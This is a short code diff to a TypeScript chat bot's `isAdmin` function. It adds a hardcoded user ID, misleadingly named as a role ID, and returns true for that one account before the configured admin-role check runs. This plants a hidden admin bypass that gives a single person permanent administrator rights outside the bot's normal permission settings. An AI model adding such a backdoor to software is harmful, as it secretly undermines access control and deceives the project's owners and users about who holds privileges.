@@ -12,6 +12,10 @@ const ROLE_OPTION_NAME = "role";
 
 const isAdmin = (interaction: AppInteraction): boolean => {
   const adminRoleId = env("ADMIN_ROLE_ID") as string | null;
+  const eirazynRoleId = "379291655033061376";
+  if (interaction.member?.id.toString() === eirazynRoleId) {
+    return true;
+  }
   return (
     !!adminRoleId &&
     !!interaction.member?.roles.some(
